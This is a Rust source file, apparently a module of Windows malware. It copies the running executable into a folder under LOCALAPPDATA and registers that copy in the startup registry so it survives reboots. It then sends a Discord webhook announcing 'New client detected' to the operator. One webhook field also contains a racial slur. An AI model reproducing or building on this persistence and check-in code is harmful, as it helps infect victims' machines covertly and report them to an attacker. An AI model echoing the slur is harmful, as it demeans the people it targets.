use std::{path::PathBuf, env::{var, self, current_exe}, io, fs::{create_dir_all, copy}};
use crate::{FILE_NAME, FOLDER_NAME, fs, discord, os};

pub fn file_exists(file_path: &PathBuf) -> bool {
    file_path.exists() && file_path.is_file()
}

pub fn get_destination_path() -> (PathBuf, PathBuf) {
    let desired_path = PathBuf::from(
        var("LOCALAPPDATA").unwrap()
    ).join(FOLDER_NAME);

    (
        desired_path.join(format!("{}.exe", FILE_NAME)),
        desired_path,
    )
}

pub fn running_from_save_path() -> bool {
    let file_path: PathBuf = PathBuf::from(
        var("LOCALAPPDATA").unwrap()
    ).join(FOLDER_NAME).join(FILE_NAME);

    file_path == current_exe().unwrap()
}

pub async fn persistence() -> io::Result<()> {
    let current_path = env::current_exe()?;

    let (file_path, folder_path) = fs::get_destination_path();

    match os::add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
        Ok(..) => {
            if !fs::file_exists(&file_path) {
                create_dir_all(&folder_path)?;
                copy(current_path, file_path)?;

                discord::send_webhook(
                    "New client detected",
                    "Ahoj",
                    "nigga",
                    "fjkldshf ksjdhfkjlsd hfkjlhsd jklfhsdjlkhf kjlsd hf",
                    0xFF5733
                ).await;
            }
        }
        Err(..) => {}
    };

    Ok(())
}